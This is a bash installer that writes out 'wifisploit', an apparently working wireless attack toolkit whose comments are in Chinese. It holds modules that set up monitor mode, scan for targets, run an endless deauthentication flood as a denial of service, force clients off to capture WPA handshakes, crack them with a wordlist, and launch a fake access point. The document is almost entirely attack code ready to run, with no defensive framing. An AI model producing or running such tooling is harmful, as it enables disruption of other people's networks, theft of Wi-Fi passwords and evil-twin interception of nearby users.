#!/bin/bash

# 创建目录结构
mkdir -p wifisploit/modules

# 选择语言版本
echo "Select language (选择语言):"
echo "1) English"
echo "2) 中文"
read -p "Enter choice: " lang_choice

if [ "$lang_choice" -eq 1 ]; then
  LANG_SUFFIX=""
elif [ "$lang_choice" -eq 2 ]; then
  LANG_SUFFIX="_zh"
else
  echo "Invalid choice, defaulting to English"
  LANG_SUFFIX=""
fi

# 创建 set_monitor_mode.sh
cat << EOF > wifisploit/modules/set_monitor_mode.sh
#!/bin/bash

INTERFACE=\$1

if [ -z "\$INTERFACE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "用法: \$0 <interface>"
  else
    echo "Usage: \$0 <interface>"
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "将\$INTERFACE设置为监听模式..."
else
  echo "Setting \$INTERFACE to monitor mode..."
fi

airmon-ng start \$INTERFACE

MONITOR_INTERFACE=\$(iw dev | awk '\$1=="Interface"{print \$2}' | grep -E "^mon")

if [ -z "\$MONITOR_INTERFACE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "未能成功将网卡设置为监听模式，请检查网卡及airmon-ng工具的状态。"
  else
    echo "Failed to set interface to monitor mode, please check the interface and airmon-ng status."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "\$INTERFACE 已设置为监听模式 \$MONITOR_INTERFACE"
else
  echo "\$INTERFACE is now in monitor mode as \$MONITOR_INTERFACE"
fi

echo \$MONITOR_INTERFACE > /tmp/current_monitor_interface
EOF

# 创建 scan_networks.sh
cat << EOF > wifisploit/modules/scan_networks.sh
#!/bin/bash

MONITOR_INTERFACE=\$(cat /tmp/current_monitor_interface)

if [ -z "\$MONITOR_INTERFACE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "请先将网卡设置为监听模式。"
  else
    echo "Please set the interface to monitor mode first."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "开始扫描周围网络..."
else
  echo "Starting to scan surrounding networks..."
fi

airodump-ng \$MONITOR_INTERFACE > /tmp/network_scan.txt &

sleep 10  # 扫描10秒

kill \$!

# 显示扫描结果并让用户选择目标
awk 'BEGIN{if ("$LANG_SUFFIX" == "_zh") print "编号\tBSSID\t\t\t频道\t加密\t信号\tSSID"; else print "Num\tBSSID\t\t\tChannel\tEncryption\tSignal\tSSID"} /^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {printf "%d\t%s\t%s\t%s\t%s\t%s\n", NR, \$1, \$6, \$8, \$4, \$14}' /tmp/network_scan.txt

if [ "$LANG_SUFFIX" == "_zh" ]; then
  read -p "选择目标网络的编号: " TARGET_NUMBER
else
  read -p "Select the target network number: " TARGET_NUMBER
fi

TARGET_BSSID=\$(awk -v num=\$TARGET_NUMBER 'BEGIN{FS="\t"} NR==num+1 {print \$2}' /tmp/network_scan.txt)
TARGET_CHANNEL=\$(awk -v num=\$TARGET_NUMBER 'BEGIN{FS="\t"} NR==num+1 {print \$3}' /tmp/network_scan.txt)

echo \$TARGET_BSSID > /tmp/current_target_bssid
echo \$TARGET_CHANNEL > /tmp/current_target_channel

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "已选择目标网络: BSSID=\$TARGET_BSSID, 频道=\$TARGET_CHANNEL"
else
  echo "Selected target network: BSSID=\$TARGET_BSSID, Channel=\$TARGET_CHANNEL"
fi
EOF

# 创建 dos_attack.sh
cat << EOF > wifisploit/modules/dos_attack.sh
#!/bin/bash

MONITOR_INTERFACE=\$(cat /tmp/current_monitor_interface)
TARGET_BSSID=\$(cat /tmp/current_target_bssid)

if [ -z "\$MONITOR_INTERFACE" ] || [ -z "\$TARGET_BSSID" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "请先选择目标网络。"
  else
    echo "Please select a target network first."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "开始对目标网络进行Dos攻击..."
else
  echo "Starting Dos attack on the target network..."
fi

aireplay-ng --deauth 0 -a \$TARGET_BSSID \$MONITOR_INTERFACE
EOF

# 创建 capture_handshake.sh
cat << EOF > wifisploit/modules/capture_handshake.sh
#!/bin/bash

MONITOR_INTERFACE=\$(cat /tmp/current_monitor_interface)
TARGET_BSSID=\$(cat /tmp/current_target_bssid)
TARGET_CHANNEL=\$(cat /tmp/current_target_channel)

if [ -z "\$MONITOR_INTERFACE" ] || [ -z "\$TARGET_BSSID" ] || [ -z "\$TARGET_CHANNEL" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "请先选择目标网络。"
  else
    echo "Please select a target network first."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "开始对目标网络进行监视以查找连接的设备..."
else
  echo "Starting monitoring the target network to find connected devices..."
fi

airodump-ng --bssid \$TARGET_BSSID --channel \$TARGET_CHANNEL --write capture --output-format csv \$MONITOR_INTERFACE &

AIRODUMP_PID=\$!

sleep 10  # 监视10秒以查找连接的设备

kill \$AIRODUMP_PID

# 检查是否找到连接的设备
CLIENT_MACS=\$(awk -F, '/Station MAC/ {found=1} found && \$1 ~ /^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {print \$1}' capture-01.csv)

if [ -z "\$CLIENT_MACS" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "未找到连接到目标网络的设备。"
  else
    echo "No devices found connected to the target network."
  fi
  exit 1
fi

# 随机选择一台设备进行踢出
CLIENT_MAC=\$(echo "\$CLIENT_MACS" | shuf -n 1)

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "踢出目标网络中的设备 \$CLIENT_MAC 以获取握手包..."
else
  echo "Kicking off device \$CLIENT_MAC from the target network to capture the handshake..."
fi

aireplay-ng --deauth 5 -a \$TARGET_BSSID -c \$CLIENT_MAC \$MONITOR_INTERFACE

# 继续监视目标网络以捕获握手包
airodump-ng --bssid \$TARGET_BSSID --channel \$TARGET_CHANNEL --write capture \$MONITOR_INTERFACE &

AIRODUMP_PID=\$!

sleep 10  # 继续监视10秒

kill \$AIRODUMP_PID

# 检查是否已捕获到握手包
if [ -f capture-01.cap ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "成功捕获到握手包，保存在 capture-01.cap"
  else
    echo "Successfully captured handshake, saved as capture-01.cap"
  fi
else
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "未捕获到握手包，请重试或检查目标网络状态。"
  else
    echo "Failed to capture handshake, please retry or check the target network status."
  fi
  exit 1
fi
EOF

# 创建 crack_handshake.sh
cat << EOF > wifisploit/modules/crack_handshake.sh
#!/bin/bash

CAPTURE_FILE="capture-01.cap"
TARGET_BSSID=\$(cat /tmp/current_target_bssid)
DICTIONARY_PATH=\$1

if [ -z "\$DICTIONARY_PATH" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "用法: \$0 <dictionary_path>"
  else
    echo "Usage: \$0 <dictionary_path>"
  fi
  exit 1
fi

if [ ! -f "\$CAPTURE_FILE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "握手包文件 \$CAPTURE_FILE 不存在。"
  else
    echo "Handshake file \$CAPTURE_FILE does not exist."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "开始破解握手包..."
else
  echo "Starting to crack the handshake..."
fi

aircrack-ng -w \$DICTIONARY_PATH -b \$TARGET_BSSID \$CAPTURE_FILE

if [ "$?" -eq 0 ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "握手包破解成功。"
  else
    echo "Successfully cracked the handshake."
  fi
else
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "未能破解握手包，请检查字典文件并重试。"
  else
    echo "Failed to crack the handshake, please check the dictionary file and retry."
  fi
  exit 1
fi
EOF

# 创建 create_fake_ap.sh
cat << EOF > wifisploit/modules/create_fake_ap.sh
#!/bin/bash

FAKE_AP_INTERFACE=\$1
FAKE_AP_SSID=\$2
FAKE_AP_CHANNEL=\$3

if [ -z "\$FAKE_AP_INTERFACE" ] || [ -z "\$FAKE_AP_SSID" ] || [ -z "\$FAKE_AP_CHANNEL" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "用法: \$0 <interface> <SSID> <channel>"
  else
    echo "Usage: \$0 <interface> <SSID> <channel>"
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "创建假AP，SSID: \$FAKE_AP_SSID，频道: \$FAKE_AP_CHANNEL..."
else
  echo "Creating fake AP with SSID: \$FAKE_AP_SSID, Channel: \$FAKE_AP_CHANNEL..."
fi

# 配置 hostapd
cat << EOL > /tmp/wifisploit/fake_ap/hostapd.conf
interface=\$FAKE_AP_INTERFACE
driver=nl80211
ssid=\$FAKE_AP_SSID
channel=\$FAKE_AP_CHANNEL
hw_mode=g
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=Password123
EOL

# 启动 hostapd
hostapd /tmp/wifisploit/fake_ap/hostapd.conf &
HOSTAPD_PID=\$!

sleep 5

# 配置 dnsmasq
cat << EOL > /tmp/wifisploit/fake_ap/dnsmasq.conf
interface=\$FAKE_AP_INTERFACE
dhcp-range=10.10.0.10,10.10.0.50,12h
dhcp-option=3,10.10.0.1
dhcp-option=6,10.10.0.1
EOL

# 启动 dnsmasq
dnsmasq -C /tmp/wifisploit/fake_ap/dnsmasq.conf

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "假AP已创建并运行。"
else
  echo "Fake AP created and running."
fi

trap "kill \$HOSTAPD_PID; exit" SIGINT
wait \$HOSTAPD_PID
EOF

# 赋予执行权限
chmod +x wifisploit/modules/*.sh

# 创建主脚本
cat << EOF > wifisploit/wifisploit.sh
#!/bin/bash

# 选择模块
echo "Select module (选择模块):"
echo "1) Set Monitor Mode"
echo "2) Scan Networks"
echo "3) DOS Attack"
echo "4) Capture Handshake"
echo "5) Crack Handshake"
echo "6) Create Fake AP"
read -p "Enter choice: " module_choice

case \$module_choice in
  1)
    wifisploit/modules/set_monitor_mode.sh
    ;;
  2)
    wifisploit/modules/scan_networks.sh
    ;;
  3)
    wifisploit/modules/dos_attack.sh
    ;;
  4)
    wifisploit/modules/capture_handshake.sh
    ;;
  5)
    read -p "Enter dictionary path: " dict_path
    wifisploit/modules/crack_handshake.sh \$dict_path
    ;;
  6)
    read -p "Enter interface: " ap_interface
    read -p "Enter SSID: " ap_ssid
    read -p "Enter channel: " ap_channel
    wifisploit/modules/create_fake_ap.sh \$ap_interface \$ap_ssid \$ap_channel
    ;;
  *)
    echo "Invalid choice"
    ;;
esac
EOF

chmod +x wifisploit/wifisploit.sh

echo "Installation completed. To run wifisploit, use: ./wifisploit/wifisploit.sh"
